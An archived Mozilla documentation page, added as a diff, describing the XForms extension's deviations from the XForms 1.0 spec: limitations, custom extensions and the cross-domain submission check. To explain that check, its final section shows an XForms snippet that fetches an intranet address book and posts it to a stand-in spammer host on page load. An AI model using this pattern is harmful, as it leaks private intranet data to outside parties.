@@ -1,0 +1,137 @@
+---
+title: Mozilla XForms Specials
+slug: Archive/Web/XForms/Mozilla_XForms_Specials
+translation_of: Archive/Web/XForms/Mozilla_XForms_Specials
+---
+<p dir="rtl"> </p>
+
+<h3 id="Introduction" name="Introduction">Introduction</h3>
+
+<p>This article gives an overview of where the <em>Mozilla XForms Extension</em> deviates from the official <em>XForms 1.0 Specification</em> . This covers both limitations in the extension, and custom extensions.</p>
+
+<h3 id="Limitations" name="Limitations">Limitations</h3>
+
+<h4 id="Repeat_Using_Attributes" name="Repeat_Using_Attributes">Repeat Using Attributes</h4>
+
+<p>The specifications mentions <a class="external" href="http://www.w3.org/TR/xforms/slice9.html#ui.repeat.via.attrs">"Creating Repeating Structures Via Attributes"</a>, this is <strong>partially</strong> supported.</p>
+
+<p>(limitation tracked in {{ Bug(280368) }})</p>
+
+<h4 id="Mixing_Repeat_and_table_or_ul" name="Mixing_Repeat_and_table_or_ul">Mixing Repeat and <code>table</code> or <code>ul</code></h4>
+
+<p>It is not possible to mix repeats with either <code>table</code> or <code>ul</code>. That means that it is <strong>not</strong> possible to do:</p>
+
+<div class="warning">
+<pre>&lt;table&gt;
+  &lt;xf:repeat ...&gt;
+    &lt;tr&gt; ... &lt;/tr&gt;
+  &lt;/xf:repeat&gt;
+&lt;/table&gt;
+</pre>
+</div>
+
+<p>or</p>
+
+<div class="warning">
+<pre>&lt;ul&gt;
+  &lt;xf:repeat ...&gt;
+    &lt;li&gt; ... &lt;/li&gt;
+  &lt;/xf:repeat&gt;
+&lt;/ul&gt;
+</pre>
+</div>
+
+<p><a class="external" href="http://www.w3.org/TR/2006/REC-xforms-20060314/slice9.html#ui.repeat.via.attrs">Section 9.3.2</a> states that mixing with <code>table</code> will probably never work. Mixing with <code>ul</code> might suffer from the same limitation.</p>
+
+<h4 id="Pseudo_class_support" name="Pseudo_class_support">Pseudo-class support</h4>
+
+<p>We currently support all the CSS <a href="/en/CSS/Pseudo-classes" title="Pseudo-classes">pseudo-classes</a> in XForms (<code>:enabled, :disabled</code>, etc. ), <strong>except</strong> for <code>:read-only</code> and <code>:read-write</code>, because of non-specified behaviour of these for (X)<a href="/en/HTML" title="en/HTML">HTML</a>. Instead you have to use <code>:-moz-read-only</code> and <code>:-moz-read-write</code> for now.</p>
+
+<p>(limitation tracked in {{ Bug(313111) }})</p>
+
+<h4 id="Pseudo_element_support" name="Pseudo_element_support">Pseudo element support</h4>
+
+<p>There is <strong>no</strong> support for the pseudo elements (<code>::value, ::repeat-item, and ::repeat-index</code> ). Instead you will have to use the following normal classes instead:</p>
+
+<ul>
+ <li><code>xf-value</code></li>
+ <li><code>xf-repeat-item</code></li>
+ <li><code>xf-repeat-index</code></li>
+</ul>
+
+<p>For example, to target the value element of an <code>input</code> control use:</p>
+
+<pre>@namespace xf url("http://www.w3.org/2002/xforms");
+xf|input .xf-value {
+  ...
+}
+</pre>
+
+<p>The pseudo elements are defined in the <em><a href="/en/CSS" title="en/CSS">CSS</a>3 Basic User Interface specification</em> .</p>
+
+<p>(limitation tracked in {{ Bug(271724) }})</p>
+
+<h4 id="Repeat_Using_Attributes" name="Repeat_Using_Attributes">Optional parameters in XPath functions</h4>
+
+<p>Optional parameters in XPath functions are not supported, you will have to specify all parameters when calling a function. This affects functions like <code>hmac()</code> or <code>digest()</code>.</p>
+
+<p>Instead of using</p>
+
+<div class="warning">
+<pre>digest('abc', 'SHA-1')
+</pre>
+</div>
+
+<p>explicitly use the third parameter (the results are equal):</p>
+
+<pre>digest('abc', 'SHA-1', 'base64')
+</pre>
+
+<p>(limitation tracked in {{ Bug(477857) }})</p>
+
+<h3 id="Extensions" name="Extensions">Extensions</h3>
+
+<h4 id="Enumerating_Instances" name="Enumerating_Instances">Enumerating Instances</h4>
+
+<p>The standardized <a href="/en/XPCOM_Interface_Reference/nsIXFormsModelElement" title="en/XPCOM_Interface_Reference/nsIXFormsModelElement">nsIXFormsModelElement</a> does not allow one to enumerate over all possible instances, but only to retrieve instances by their name. In the <em>Mozilla XForms Extension</em> we added a <code>getInstanceDocuments()</code> function to the <code>model</code> which returns all the model's instance documents. This is documented in <a href="/en/XPCOM_Interface_Reference/nsIXFormsNSModelElement" title="en/XPCOM_Interface_Reference/nsIXFormsNSModelElement">nsIXFormsNSModelElement</a>.</p>
+
+<h4 id="Getting_To_Instance_Element_From_A_Data_Node" name="Getting_To_Instance_Element_From_A_Data_Node">Getting To Instance Element From A Data Node</h4>
+
+<p>In the XForms 1.0 specification there is no way to get to the <code>instance</code> element from an instance data node. We have added a function via the <code>getFeature()</code> call on each node, that allows the form author to do that. That is, if <code>instanceNode</code> is a node in an instance document, then:</p>
+
+<pre>instanceNode.getFeature("org.mozilla.xforms.instanceOwner", "1.0")
+</pre>
+
+<p>will return the <code>&lt;instance&gt;</code> element (in the main document) that the node belongs to.</p>
+
+<h4 id="Getting_To_The_Instance_Document_From_The_Instance_Element" name="Getting_To_The_Instance_Document_From_The_Instance_Element">Getting To The Instance Document From The Instance Element</h4>
+
+<p>In the XForms 1.0 specification you have to go through the <code>model</code> element to get to the instance document. It seems a bit awkward if you have the <code>instance</code> element, so we have added a <code>getInstanceDocument()</code> function directly on the <code>instance</code> element as a shortcut. This is documented in <a href="/en/XPCOM_Interface_Reference/nsIXFormsNSInstanceElement" title="en/XPCOM_Interface_Reference/nsIXFormsNSInstanceElement">nsIXFormsNSInstanceElement</a>.</p>
+
+<h4 id="Custom_Control_Interface" name="Custom_Control_Interface">Custom Control Interface</h4>
+
+<p>We have added a lot of functionality to our user interface, which allows the form authors to create <em>custom controls</em>. It involves exposing some (script) functionality on all our controls, like <code>output</code>, <code>input</code>, etc. and allowing the UI to be represented in <a href="/en/XBL" title="en/XBL">XBL</a>. More information can be found in <a href="/en/XForms/Custom_Controls" title="en/XForms/Custom_Controls">XForms:Custom Controls</a>.</p>
+
+<h4 id="labelposition">labelposition</h4>
+
+<p>For <code>xforms:input </code>elements bound to a boolean node we support an attribute <code>labelposition</code> in the namespace <code><a class="external" href="http://www.mozilla.org/projects/xforms/2009/extensions" rel="freelink">http://www.mozilla.org/projects/xfor...009/extensions</a></code>, which allows the form author to define on which side of the checkbox the label will be shown. For details, see the <a href="/en/XForms/User_Interface_Elements/Input" title="https://developer.mozilla.org/en/XForms/User_Interface_Elements/Input">input control documentation</a>.</p>
+
+<h3 id="Misc" name="Misc">Misc</h3>
+
+<h4 id="Cross_Domain_Submission" name="Cross_Domain_Submission">Cross Domain Submission</h4>
+
+<p>Not exactly either a limitation, or an extension, but it is worth mentioning here. For security reasons, it is not per default possible for an XForms to submit data to another domain. This is due to security reasons. Information about how to whitelist domain can be found in the <em>Release Notes</em></p>
+
+<p>The cross domain check also includes forms loaded from <code>file://</code>. Forms loaded from that URL should be local files, and thus trusted, but it is not always the case. So there is not automatic "whitelisting" of local files.</p>
+
+<p>If you are wondering why we have this restriction, here is a simple example of why:</p>
+
+<pre>&lt;xforms:model&gt;
+  &lt;xforms:instance src="http://intranetserver/addrbook.xml"/&gt;
+  &lt;xforms:submission id="sub" action="http://megaspammer.com/gather"
+                     method="post"/&gt;
+  &lt;xforms:send submission="sub" ev:event="xforms-ready"/&gt;
+&lt;/xforms:model&gt;
+</pre>
+
+<p>This imaginary would fetch something that is only accessible for you (f.x. behind a firewall) <code><span class="nowiki">http://intranetserver/addrbook.xml</span></code>, and send it to <code><span class="nowiki">http://megaspammer.com/gather</span></code> as soon as you view the XForm.</p>
